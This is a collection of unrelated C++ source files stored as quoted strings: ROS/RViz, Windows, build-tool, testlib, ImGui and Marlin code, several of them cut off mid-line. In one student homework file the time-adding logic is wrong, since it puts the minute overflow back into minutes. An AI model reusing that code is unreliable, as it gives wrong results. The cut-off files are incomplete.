    "#include \"pose_get_plugin/goal_tool.h\"\n#include <tf2/LinearMath/Quaternion.h>\n#include <tf2/LinearMath/Matrix3x3.h>\n\nnamespace rviz_plugin\n{\nGoalTool::GoalTool() : dragging_(false), waypoint_saver_(\"/home/ray/waypoints.txt\"), waypoint_id_(1) {}\n\nGoalTool::~GoalTool() {}\n\nvoid GoalTool::onInitialize()\n{\n  marker_manager_.initialize(nh_);\n}\n\nvoid GoalTool::activate() {}\n\nvoid GoalTool::deactivate() {}\n\nint GoalTool::processMouseEvent(rviz::ViewportMouseEvent& event)\n{\n  if (event.leftDown())\n  {\n    Ogre::Vector3 position;\n    if (context_->getSelectionManager()->get3DPoint(event.viewport, event.x, event.y, position))\n    {\n      position.z = 0; // \u56fa\u5b9az\u5750\u6807\n      start_position_ = position;\n      marker_manager_.setPosition(position);\n      dragging_ = true;\n    }\n  }\n  else if (event.leftUp())\n  {\n    if (dragging_)\n    {\n      dragging_ = false;\n      Ogre::Vector3 end_position;\n      if (context_->getSelectionManager()->get3DPoint(event.viewport, event.x, event.y, end_position))\n      {\n        end_position.z = 0; // \u56fa\u5b9az\u5750\u6807\n        Ogre::Vector3 direction = end_position - start_position_;\n        direction.z = 0; // \u786e\u4fdd\u65b9\u5411\u5728\u6c34\u5e73\u9762\u4e0a\n        direction.normalise();\n        Ogre::Quaternion orientation = Ogre::Vector3::UNIT_X.getRotationTo(direction);\n        marker_manager_.setOrientation(orientation);\n\n        // \u8ba1\u7b97\u5e76\u8f93\u51fa\u56db\u5143\u6570\u548c\u6b27\u62c9\u89d2\n        tf2::Quaternion tf_quat(orientation.x, orientation.y, orientation.z, orientation.w);\n        double roll, pitch, yaw;\n        tf2::Matrix3x3(tf_quat).getRPY(roll, pitch, yaw);\n\n        ROS_INFO_STREAM(\"Goal position: \" << start_position_.x << \", \" << start_position_.y << \", \" << start_position_.z);\n        ROS_INFO_STREAM(\"Goal orientation (quaternion): [\" << orientation.x << \", \" << orientation.y << \", \" << orientation.z << \", \" << orientation.w << \"]\");\n\n        // \u4fdd\u5b58waypoint\n        geometry_msgs::Pose pose;\n        pose.position.x = start_position_.x;\n        pose.position.y = start_position_.y;\n        pose.position.z = start_position_.z;\n        pose.orientation.x = orientation.x;\n        pose.orientation.y = orientation.y;\n        pose.orientation.z = orientation.z;\n        pose.orientation.w = orientation.w;\n        waypoint_saver_.addWaypoint(pose, waypoint_id_);\n        waypoint_saver_.saveWaypoints();\n\n        // \u8f93\u51fa\u8def\u5f84\u70b9\u4fe1\u606f\n        ROS_INFO_STREAM(\"Waypoint ID: \" << waypoint_id_ << \", Position: (\" << pose.position.x << \", \" << pose.position.y << \", \" << pose.position.z << \"), Orientation: (\" << pose.orientation.x << \", \" << pose.orientation.y << \", \" << pose.orientation.z << \", \" << pose.orientation.w << \")\");\n        ROS_INFO_STREAM(\"Waypoints saved to file.\");\n\n        // \u589e\u52a0\u8def\u5f84\u70b9\u7f16\u53f7\n        waypoint_id_++;\n      }\n    }\n  }\n  else if (event.rightDown())\n  {\n    waypoint_saver_.removeLastWaypoint();\n    if (waypoint_id_ > 1) // \u786e\u4fdd\u7f16\u53f7\u4e0d\u5c0f\u4e8e1\n    {\n      waypoint_id_--;\n    }\n  }\n  else if (event.type == QEvent::MouseMove && dragging_)\n  {\n    Ogre::Vector3 current_position;\n    if (context_->getSelectionManager()->get3DPoint(event.viewport, event.x, event.y, current_position))\n    {\n      current_position.z = 0; // \u56fa\u5b9az\u5750\u6807\n      Ogre::Vector3 direction = current_position - start_position_;\n      direction.z = 0; // \u786e\u4fdd\u65b9\u5411\u5728\u6c34\u5e73\u9762\u4e0a\n      direction.normalise();\n      Ogre::Quaternion orientation = Ogre::Vector3::UNIT_X.getRotationTo(direction);\n      marker_manager_.setOrientation(orientation);\n    }\n  }\n  return Render;\n}\n\n} // namespace rviz_plugin\n\n#include <pluginlib/class_list_macros.h>\nPLUGINLIB_EXPORT_CLASS(rviz_plugin::GoalTool, rviz::Tool)",
    "// do not change the code in this source file\n#include <iostream>\n#include \"matrixMul.h\"\n\nusing namespace std;\n\nint main() {\n    int row1, col1; // for matrix1\n    int row2, col2; // for matrix2\n\n    // create 2D matrix1\n    cin >> row1 >> col1; // get the number of rows and columns\n    int** matrix1 = new int* [row1]; // create an array for row1 pointers\n    for (int i=0; i<row1; i++) {\n        matrix1[i] = new int [col1]; // create an array for col1 integers for each array pointer\n    }\n    // get row1 x col1 element values of matrix1\n    for (int r=0; r<row1; r++) {\n        for (int c=0; c<col1; c++) {\n            cin >> matrix1[r][c];\n        }\n    }\n\n    // create 2D matrix2\n    cin >> row2 >> col2;\n    int** matrix2 = new int* [row2];\n    for (int i=0; i<row2; i++) {\n        matrix2[i] = new int [col2];\n    }\n    for (int r=0; r<row2; r++) {\n        for (int c=0; c<col2; c++) {\n            cin >> matrix2[r][c];\n        }\n    }\n\n    printMatrixMul(matrix1, row1, col1, matrix2, row2, col2); // call printMatrixMul() to compute matrix1 * matrix2\n\n    // deallocate the memory\n    for (int i=0; i<row2; i++) {\n        delete [] matrix2[i];\n    }\n    delete [] matrix2;\n\n    for (int i=0; i<row1; i++) {\n        delete [] matrix1[i];\n    }\n    delete [] matrix1;\n\n    return 0;\n}\n",
    "// amc10453_hw2_q3.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\nusing namespace std;\n\n// Step 1: Get user input: Get Johns days worked, hours worked, minutes worked. Get Bills days worked, hours, and minutes worked.\n// \n// Step 2: Process the input: Add the days together. Add the hours together. Add minutes worked together. Add minutes worked together.\n// Step 2: If hours added are > greater than 24, convert to a day and keep remained\n// Step 2: If minutes are greater than 60, convert to an hour and keep remainder\n// \n// Step 3: Apply the logic\n// \n// Step 4: Output the result\n\n\nint main()\n{\n    int johnDaysWorked, billDaysWorked, totalDaysWorked, totalMinsWorked, totalHoursWorked, johnHoursWorked, johnsMinutesWorked, billHoursWorked, billMinutesworked;\n    \n    cout << \"Please enter the number of days John has worked: \"; \n    cin >> johnDaysWorked; \n    cout << \"Please enter the number of hours John has worked: \";\n    cin >> johnHoursWorked;\n    cout << \"Please enter the number of minutes John has worked: \";\n    cin >> johnsMinutesWorked;\n    cout << \"\\n\";\n    cout << \"\\n\";\n    cout << \"Please enter the number of days Bill has worked: \";\n    cin >> billDaysWorked;\n    cout << \"Please enter the number of hours Bill has worked: \";\n    cin >> billHoursWorked;\n    cout << \"Please enter the number of minutes Bill has worked: \";\n    cin >> billMinutesworked;\n\n\n    totalDaysWorked = johnDaysWorked + billDaysWorked;\n    totalHoursWorked = johnHoursWorked + billHoursWorked;\n    totalMinsWorked = johnsMinutesWorked + billMinutesworked;\n    \n    if (totalHoursWorked > 24)\n    {\n        totalDaysWorked += totalHoursWorked / 24;\n        totalHoursWorked = totalHoursWorked % 24;\n         \n    }\n    \n    if (totalMinsWorked > 60) \n    {\n       totalMinsWorked += totalMinsWorked / 60;\n       totalMinsWorked = totalMinsWorked % 60;\n    }\n\n    cout << \"The total time both of them worked together is: \" << totalDaysWorked << \" days, \" << totalHoursWorked << \" hours and \" << totalMinsWorked << \" minutes\";\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include <iomanip>\n#include <cmath>\n#include <ostream>\n#include <windows.h>\n#include <tlhelp32.h>\n#include <psapi.h>\n\nvoid getProcessList();\nvoid displayHeaders();\nvoid displayInfo(PROCESSENTRY32 pe32, DWORD dwPriorityClass, PROCESS_MEMORY_COUNTERS pmc);\nvoid displayValue(SIZE_T valueInBytes, int width);\n\nint main(void)\n{\n    getProcessList();\n    return 0;\n}\n\nvoid getProcessList()\n{\n    HANDLE hProcessSnap, hProcess;\n    PROCESSENTRY32 pe32;\n    DWORD dwPriorityClass;\n    PROCESS_MEMORY_COUNTERS pmCounters;\n\n    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    if (hProcessSnap == INVALID_HANDLE_VALUE)\n    {\n        std::cout << \"Unable to create ToolHelp32 snapshot of processes \\nError: \"\n                  << GetLastError();\n        return;\n    }\n\n    pe32.dwSize = sizeof(PROCESSENTRY32);\n    if (!Process32First(hProcessSnap, &pe32))\n    {\n        std::cout << \"Failed to retrieve info about [System process] \\nError: \"\n                  << GetLastError();\n        CloseHandle(hProcessSnap);\n        return;\n    }\n\n    displayHeaders();\n\n    do\n    {\n        dwPriorityClass = 0;\n        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);\n        if (hProcess == NULL)\n        {\n            continue;\n        }\n\n        dwPriorityClass = GetPriorityClass(hProcess);\n        if (GetProcessMemoryInfo(hProcess, &pmCounters, sizeof(pmCounters)) == 0)\n        {\n            std::cout << \"Failed to get information regarding process memory for process with pid: \" << pe32.th32ProcessID\n                      << \" | Error: \" << GetLastError() << \"\\n\";\n            continue;\n        }\n\n        displayInfo(pe32, dwPriorityClass, pmCounters);\n        CloseHandle(hProcess);\n\n    } while (Process32Next(hProcessSnap, &pe32));\n\n    CloseHandle(hProcessSnap);\n    return;\n}\n\nvoid displayInfo(PROCESSENTRY32 pe32, DWORD dwPriorityClass, PROCESS_MEMORY_COUNTERS pmc)\n{\n    std::cout << std::left << std::setw(60) << std::setfill(' ') << pe32.szExeFile\n              << std::right << std::setw(6) << std::setfill(' ') << pe32.th32ProcessID\n              << std::right << std::setw(14) << std::setfill(' ') << pe32.cntThreads\n              << std::right << std::setw(13) << std::setfill(' ') << pe32.th32ParentProcessID\n              << std::right << std::setw(16) << std::setfill(' ') << pe32.pcPriClassBase\n              << std::right << std::setw(17) << std::setfill(' ') << dwPriorityClass\n              << std::right << std::setw(15) << std::setfill(' ') << pmc.PageFaultCount;\n\n    displayValue(pmc.WorkingSetSize, 11);\n    displayValue(pmc.PeakWorkingSetSize, 15);\n    displayValue(pmc.PagefileUsage, 14);\n    displayValue(pmc.PeakPagefileUsage, 20);\n    std::cout << \"\\n\";\n}\n\nvoid displayValue(SIZE_T valueInBytes, int width)\n{\n    if (valueInBytes > 1048576)\n    {\n        std::cout << std::right << std::setw(width) << std::setfill(' ') << round(double(valueInBytes / 1048576)) << \"MB\";\n    }\n    else if (valueInBytes > 1024)\n    {\n        std::cout << std::right << std::setw(width) << std::setfill(' ') << round(double(valueInBytes / 1024)) << \"KB\";\n    }\n    else\n    {\n        std::cout << std::right << std::setw(width + 1) << std::setfill(' ') << valueInBytes << \"B\";\n    }\n}\n\nvoid displayHeaders()\n{\n    std::cout << std::left << std::setw(60) << std::setfill(' ') << \"Process Name\"\n              << std::right << std::setw(6) << std::setfill(' ') << \"PID\"\n              << std::right << std::setw(14) << std::setfill(' ') << \"Thread count\"\n              << std::right << std::setw(13) << std::setfill(' ') << \"Parent PID\"\n              << std::right << std::setw(16) << std::setfill(' ') << \"Priority base\"\n              << std::right << std::setw(17) << std::setfill(' ') << \"Priority class\"\n              << std::right << std::setw(15) << std::setfill(' ') << \"Page Faults\"\n              << std::right << std::setw(13) << std::setfill(' ') << \"Mem Usage\"\n              << std::right << std::setw(17) << std::setfill(' ') << \"Peak Mem Usage\"\n              << std::right << std::setw(16) << std::setfill(' ') << \"Pagefile Usage\"\n              << std::right << std::setw(23) << std::setfill(' ') << \"Peak Pagefile Usage\\n\"\n              << std::left << std::setw(209) << std::setfill('=') << \"=\" << \"\\n\";\n}\n",
    "// gaia is the most GOATED build tool for C++, created by Lucia Cover\n\n#include \"gaia.hpp\"\n\n#include <algorithm>\n#include <cstdio>\n#include <cstdlib>\n#include <filesystem>\n#include <format>\n#include <functional>\n#include <numeric>\n#include <set>\n#include <sys/stat.h>\n#include <sys/types.h>\n\n#define error(msg, ...)                                   \\\n    do {                                                  \\\n        fprintf(stderr, \"[-] \" msg \"\\n\", ##__VA_ARGS__);  \\\n        std::exit(1);                                     \\\n    } while (0)\n\n#define info(msg, ...) \\\n    printf(\"[i] \" msg \"\\n\", ##__VA_ARGS__)\n\n#define echo(msg, ...) \\\n    if (gaia::echo) printf(\"\" msg \"\\n\", ##__VA_ARGS__)\n\nauto add_many(const std::function<void(std::string)> &func,\n    const std::vector<std::string> &input) -> void;\nauto combine_vector(const std::vector<std::string> &input,\n    const std::string &prefix = \"\") -> std::string;\nauto get_file_mod_time(const std::string &filename) -> long;\nauto fix_directory(std::string &directory) -> void;\n\nauto recompile_gaia() -> void;\nauto compilation_invalid() -> bool;\nauto create_build_directory() -> void;\n\nauto handle_flags(const std::vector<std::string> &args) -> void;\n\nauto main(const int argc, const char **argv) -> int {\n    handle_flags(std::vector<std::string>{argv, argv +argc});\n\n    gaia::output_directory = \"build\";\n    gaia::add_command(\"echo $compile_cmd\");\n    gaia::add_flags({ \"-Wall\", \"-Wextra\" });\n    gaia::add_file(\"src/main.cpp\");\n    gaia::build();\n    /* PLACE BUILD CODE HERE */\n    return 0;\n}\n\n/**\n * @note this should be run last!\n * @brief builds the program.\n * \n */\nauto gaia::build() -> void {\n    // setting the compiler to the one used for gaia, if none is given\n    if (gaia::compiler == \"\") {\n        #if defined(__clang__)\n        gaia::compiler = \"clang++\";\n        #elif defined(__GNUG__)\n        gaia::compiler = \"g++\";\n        #else\n        #warning could not detect valid compiler!\n        error(\"no valid compiler given!\");\n        #endif\n    }\n\n    recompile_gaia();\n    create_build_directory();\n\n    if (gaia::input_files.size() == 0) error(\"no input files given!\");\n\n    fix_directory(gaia::output_directory);\n    fix_directory(gaia::input_directory);\n\n    const std::string files = combine_vector(gaia::input_files, gaia::input_directory);\n    const std::string flags = combine_vector(gaia::flags);\n\n    const std::string compile_command = std::format(\"{} -o {}{}{} {}\",\n        gaia::compiler, gaia::output_directory, gaia::output_name,\n        (flags.length() > 0 ? \" \" + flags : \"\"),\n        (files.length() > 0 ? \" \" + files : \"\"));\n\n    if (setenv(\"compile_cmd\", compile_command.c_str(), 1) == -1)\n        error(\"could not set environment variable\");\n\n    if (compilation_invalid()) {\n        info(\"compiling program\");\n        echo(\"%s\", compile_command.c_str());\n\n        if (std::system(compile_command.c_str()) != 0)\n            error(\"error during compilation\");\n    } else {\n        info(\"no code updated, skipping compilation\");\n    }\n\n    for (const auto extra : gaia::extra_commands) {\n        info(\"running extra command\");\n        echo(\"%s\", extra.c_str());\n        std::system(extra.c_str());\n    }\n}\n\n/**\n * @brief recompiles gaia, if needed.\n * \n */\nauto recompile_gaia() -> void {\n    const long gaia_mod_time = get_file_mod_time(\"gaia\");\n    const long gaia_src_mod_time = get_file_mod_time(\"gaia.cpp\");\n\n    // this probably means there's some fucked up file issue\n    if (gaia_mod_time == -1 || gaia_src_mod_time == -1)\n        error(\"error getting file modification times!\");\n    \n    // checks if the source code has changed since gaia was last compiled\n    if (gaia_src_mod_time > gaia_mod_time) {\n        info(\"recompiling gaia\");\n        const std::string compile_command = std::format(\"{} -std=c++20 -o gaia gaia.cpp\",\n            gaia::compiler); \n\n        const std::string run_command = std::format(\"./gaia{}{}\",\n            (gaia::force_compile ? \" -f\" : \"\"),\n            (gaia::echo ? \" -e\" : \"\"));\n        \n        std::system(compile_command.c_str());\n        std::system(run_command.c_str());\n\n        // we exit here, otherwise there's an infinite loop.\n        std::exit(0);\n    }\n}\n\n/**\n * @brief checks if the program has to be recompiled.\n * \n * @return true the program must be recompiled\n * @return false the program won't be recompiled\n */\nauto compilation_invalid() -> bool {\n    if (gaia::force_compile) return true;\n\n    const std::string output_file = std::format(\"{}{}\",\n        gaia::output_directory,\n        gaia::output_name);\n    \n    const long output_mod_time = get_file_mod_time(output_file);\n\n    // this (usually) means the output file doesn't exist yet\n    if (output_mod_time == -1) return true;\n\n    for (std::string file : gaia::input_files) {\n        file = std::format(\"{}{}\", gaia::input_directory, file);\n        const long file_mod_time = get_file_mod_time(file);\n\n        if (file_mod_time == -1) return true;\n\n        if (file_mod_time > output_",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"last_exam\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n * It is strictly recommended to include \"testlib.h\" before any other include\n * in your code. In this case testlib overrides compiler specific \"random()\".\n *\n * If you can't compile your code and compiler outputs something about\n * ambiguous call of \"random_shuffle\", \"rand\" or \"srand\" it means that\n * you shouldn't use them. Use \"shuffle\", and \"rnd.next()\" instead of them\n * because these calls produce stable result for any C++ compiler. Read\n * sample generator sources for clarification.\n *\n * Please read the documentation for class \"random_t\" and use \"rnd\" instance in\n * generators. Probably, these sample calls will be useful for you:\n *              rnd.next(); rnd.next(100); rnd.next(1, 2);\n *              rnd.next(3.14); rnd.next(\"[a-z]{1,100}\").\n *\n * Also read about wnext() to generate off-center random distribution.\n *\n * See https://github.com/MikeMirzayanov/testlib/ to get latest version or bug tracker.\n */\n\n#ifndef _TESTLIB_H_\n#define _TESTLIB_H_\n\n/*\n * Copyright (c) 2005-2024\n */\n\n#define VERSION \"0.9.43\"\n\n/*\n * Mike Mirzayanov\n *\n * This material is provided \"as is\", with absolutely no warranty expressed\n * or implied. Any use is at your own risk.\n *\n * Permission to use or copy this software for any purpose is hereby granted\n * without fee, provided the above notices are retained on all copies.\n * Permission to modify the code and to distribute modified code is granted,\n * provided the above notices are retained, and a notice that the code was\n * modified is included with the above copyright notice.\n *\n */\n\n/* NOTE: This file contains testlib library for C++.\n *\n *   Check, using testlib running format:\n *     check.exe <Input_File> <Output_File> <Answer_File> [<Result_File> [-appes]],\n *   If result file is specified it will contain results.\n *\n *   Validator, using testlib running format:\n *     validator.exe < input.txt,\n *   It will return non-zero exit code and writes message to standard output.\n *\n *   Generator, using testlib running format:\n *     gen.exe [parameter-1] [parameter-2] [... paramerter-n]\n *   You can write generated test(s) into standard output or into the file(s).\n *\n *   Interactor, using testlib running format:\n *     interactor.exe <Input_File> <Output_File> [<Answer_File> [<Result_File> [-appes]]],\n *   Reads test from inf (mapped to args[1]), writes result to tout (mapped to argv[2],\n *   can be judged by checker later), reads program output from ouf (mapped to stdin),\n *   writes output to program via stdout (use cout, printf, etc).\n */\n\nconst char *latestFeatures[] = {\n        \"Added ConstantBoundsLog, VariablesLog to validator testOverviewLogFile\",\n        \"Use setAppesModeEncoding to change xml encoding from windows-1251 to other\",\n        \"rnd.any/wany use distance/advance instead of -/+: now they support sets/multisets\",\n        \"Use syntax `int t = inf.readInt(1, 3, \\\"~t\\\");` to skip the lower bound check. Tildes can be used on either side or both: ~t, t~, ~t~\",\n        \"Supported EJUDGE support in registerTestlibCmd\",\n        \"Supported '--testMarkupFileName fn' and '--testCase tc/--testCaseFileName fn' for validators\",\n        \"Added opt defaults via opt<T>(key/index, default_val); check unused opts when using has_opt or default opt (turn off this check with suppressEnsureNoUnusedOpt()).\",\n        \"For checker added --group and --testset command line params (like for validator), use checker.group() or checker.testset() to get values\",\n        \"Added quitpi(points_info, message) function to return with _points exit code 7 and given points_info\",\n        \"rnd.partition(size, sum[, min_part=1]) returns random (unsorted) partition which is a representation of the given `sum` as a sum of `size` positive integers (or >=min_part if specified)\",\n        \"rnd.distinct(size, n) and rnd.distinct(size, from, to)\",\n        \"opt<bool>(\\\"some_missing_key\\\") returns false now\",\n        \"has_opt(key)\",\n        \"Abort validator on validator.testset()/validator.group() if registered without using command line\",\n        \"Print integer range violations in a human readable way like `violates the range [1, 10^9]`\",\n        \"Opts supported: use them like n = opt<int>(\\\"n\\\"), in a command line you can use an exponential notation\",\n        \"Reformatted\",\n        \"Use setTestCase(i) or unsetTestCase() to support test cases (you can use it in any type of program: generator, interactor, validator or checker)\",\n        \"Fixed issue #87: readStrictDouble accepts \\\"-0.00\\\"\",\n        \"Fixed issue #83: added InStream::quitif(condition, ...)\",\n        \"Fixed issue #79: fixed missed guard against repeated header include\",\n        \"Fixed issue #80: fixed UB in case of huge quitf message\",\n        \"Fixed issue #84: added readXs(size, indexBase = 1)\",\n        \"Fixed stringstream repeated usage issue\",\n        \"Fixed compilation in g++ (for std=c++03)\",\n        \"Batch of println functions (support collections, iterator ranges)\",\n        \"Introduced rnd.perm(size, first = 0) to generate a `fir",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32-bits AND 64-bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Keyboard support. Since 1.87 we are using the io.AddKeyEvent() function. Pass ImGuiKey values to all key functions e.g. ImGui::IsKeyPressed(ImGuiKey_Space). [Legacy VK_* values will also be supported unless IMGUI_DISABLE_OBSOLETE_KEYIO is set]\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Multi-viewport support (multiple windows). Enable with 'io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <windowsx.h> // GET_X_LPARAM(), GET_Y_LPARAM()\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2023-XX-XX: Platform: Added support for multiple windows via the ImGuiPlatformIO interface.\n//  2023-02-15: Inputs: Use WM_NCMOUSEMOVE / WM_NCMOUSELEAVE to track mouse position over non-client area (e.g. OS decorations) when app is not focused. (#6045, #6162)\n//  2023-02-02: Inputs: Flipping WM_MOUSEHWHEEL (horizontal mouse-wheel) value to match other backends and offer consistent horizontal scrolling direction. (#4019, #6096, #1463)\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-28: Inputs: Convert WM_CHAR values with MultiByteToWideChar() when window class was registered as MBCS (not Unicode).\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introduced in 1.87 to ImGuiMod_XXX (old names still supported).\n//  2022-01-26: Inputs: replaced short-lived io.AddKeyModsEvent() (added two weeks ago) with io.AddKeyEvent() using ImGuiKey_ModXXX flags. Sorry for the confusion.\n//  2021-01-20: Inputs: calling new io.AddKeyAnalogEvent() for gamepad support, instead of writing directly to io.NavInputs[].\n//  2022-01-17: Inputs: calling new io.AddMousePosEvent(), io.AddMouseButtonEvent(), io.AddMouseWheelEvent() API (1.87+).\n//  2022-01-17: Inputs: always update key mods next and before a key event (not in NewFrame) to fix input queue with very low framerates.\n//  2022-01-12: Inputs: Update mouse inputs using WM_MOUSEMOVE/WM_MOUSELEAVE + fallback to provide it when focused but not hovered/captured. More standard and will allow us to pass it to future input queue API.\n//  2022-01-12: Inputs: Maintain our own copy of MouseButtonsDown mask instead of using ImGui::IsAnyMouseDown() which will be obsoleted.\n//  2022-01-10: Inputs: calling new io.AddKeyEvent(), io.AddKeyModsEvent() + io.SetKeyEventNativeData() API (1.87+). Support for full ImGuiKey range.\n//  2021-12-16: Inputs: Fill VK_LCONTROL/VK_RCONTROL/VK_LSHIFT/VK_RSHIFT/VK_LMENU/VK_RMENU for completeness.\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host window doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1).\n//  2021-03-23: Inputs: Clearing keyboard down array when losing focus (WM_KILLFOCUS).\n//  2021-02-18: Added ImGui_ImplWin32_EnableAlphaCompositing(). Non Vi",
    "/**\n * Marlin 3D Printer Firmware\n * Copyright (c) 2021 MarlinFirmware [https://github.com/MarlinFirmware/Marlin]\n *\n * Based on Sprinter and grbl.\n * Copyright (c) 2011 Camiel Gubbels / Erik van der Zalm\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n */\n\n#include \"../../../inc/MarlinConfigPre.h\"\n\n#if ENABLED(DGUS_LCD_UI_RELOADED)\n\n#include \"DGUSSetupHandler.h\"\n\n#include \"DGUSDisplay.h\"\n#include \"DGUSScreenHandler.h\"\n\n#include \"../../../gcode/queue.h\"\n\n#if HAS_MEDIA\n  bool DGUSSetupHandler::Print() {\n    dgus_screen_handler.filelist.refresh();\n\n    while (!dgus_screen_handler.filelist.isAtRootDir()) {\n      dgus_screen_handler.filelist.upDir();\n    }\n\n    dgus_screen_handler.filelist_offset = 0;\n    dgus_screen_handler.filelist_selected = -1;\n\n    return true;\n  }\n#endif\n\nbool DGUSSetupHandler::PrintStatus() {\n  if (ExtUI::isPrinting() || ExtUI::isPrintingPaused()) {\n    return true;\n  }\n\n  dgus_screen_handler.TriggerScreenChange(DGUS_Screen::PRINT_FINISHED);\n  return false;\n}\n\nbool DGUSSetupHandler::PrintAdjust() {\n  if (ExtUI::isPrinting() || ExtUI::isPrintingPaused()) {\n    return true;\n  }\n\n  dgus_screen_handler.TriggerScreenChange(DGUS_Screen::PRINT_FINISHED);\n  return false;\n}\n\nbool DGUSSetupHandler::LevelingMenu() {\n  ExtUI::setLevelingActive(dgus_screen_handler.leveling_active);\n\n  if (!dgus_screen_handler.IsPrinterIdle()) {\n    dgus_screen_handler.SetStatusMessage(FPSTR(DGUS_MSG_BUSY));\n    return false;\n  }\n\n  if (ExtUI::isPositionKnown()) {\n    if (ExtUI::getAxisPosition_mm(ExtUI::Z) < 10.0f) {\n      queue.enqueue_now(F(\"G0Z10\"));\n    }\n\n    return true;\n  }\n\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 1);\n  dgus_screen_handler.SetMessageLinePGM(DGUS_MSG_HOMING, 2);\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 3);\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 4);\n  dgus_screen_handler.ShowWaitScreen(DGUS_Screen::LEVELING_MENU);\n\n  queue.enqueue_now_P(DGUS_CMD_HOME);\n\n  return false;\n}\n\nbool DGUSSetupHandler::LevelingManual() {\n  ExtUI::setLevelingActive(false);\n\n  if (ExtUI::isPositionKnown()) {\n    return true;\n  }\n\n  if (!dgus_screen_handler.IsPrinterIdle()) {\n    dgus_screen_handler.SetStatusMessage(FPSTR(DGUS_MSG_BUSY));\n    return false;\n  }\n\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 1);\n  dgus_screen_handler.SetMessageLinePGM(DGUS_MSG_HOMING, 2);\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 3);\n  dgus_screen_handler.SetMessageLinePGM(NUL_STR, 4);\n  dgus_screen_handler.ShowWaitScreen(DGUS_Screen::LEVELING_MANUAL);\n\n  queue.enqueue_now_P(DGUS_CMD_HOME);\n\n  return false;\n}\n\nbool DGUSSetupHandler::LevelingOffset() {\n  dgus_screen_handler.offset_steps = DGUS_Data::StepSize::MMP1;\n\n  if (!dgus_screen_handler.IsPrinterIdle()) {\n    